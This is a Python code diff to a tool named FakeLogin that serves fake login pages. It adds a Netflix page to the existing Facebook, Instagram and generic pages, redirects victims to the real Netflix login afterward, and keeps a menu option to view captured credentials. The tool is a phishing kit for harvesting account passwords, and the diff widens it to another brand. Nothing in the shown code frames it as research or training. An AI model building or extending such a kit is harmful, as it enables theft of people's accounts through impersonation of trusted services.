@@ -27,6 +27,11 @@ class FakeLogin:
                 contenido = file.read()
             template_name = 'Generica'
             redirect_url = "https://wikipedia.org"
+        elif option == 4:
+            with open('template/netflix/index-Netflix.html', 'r') as file:
+                contenido = file.read()
+            template_name = 'Netflix'
+            redirect_url = "https://www.netflix.com/login"    
         else:
             contenido = "<h1>Página no encontrada</h1>"
             template_name = None
@@ -78,20 +83,21 @@ def seleccionar_opcion():
     print('1. FACEBOOK')
     print('2. INSTAGRAM')
     print('3. GENERICA')
-    print('4. Ver Credenciales capturadas')
-    print('5. Salir')
+    print('4. NETFLIX')
+    print('5. Ver Credenciales capturadas')
+    print('6. Salir')
     while True:
         try:
-            option = int(input("\nSeleccione una opciÃ³n: "))
-            if option in [1, 2, 3]:
+            option = int(input("\nSeleccione una opción: "))
+            if option in [1, 2, 3, 4]:
                 selected_option = option
                 break
-            if option == 4:
+            if option == 5:
                 try:
                     view_credentiales()
                 except Exception as e:
                     print('Error en la lectura del archivo o está vacío')
-            if option == 5:
+            if option == 6:
                 print('Saliendo del programa...')
                 exit()
             else:
